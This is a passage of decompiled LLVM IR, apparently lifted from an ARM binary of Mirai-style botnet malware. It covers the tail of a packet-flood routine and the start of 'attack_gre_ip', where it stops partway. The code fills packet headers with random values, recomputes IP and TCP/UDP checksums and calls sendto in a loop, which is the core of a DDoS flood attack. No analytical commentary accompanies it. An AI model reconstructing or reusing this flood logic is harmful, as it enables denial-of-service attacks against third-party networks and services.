  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %bb86, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, 65280
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v5_8f50 = call i32 @llvm.bswap.i32(i32 %v0_8f34)
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb86

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb86:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
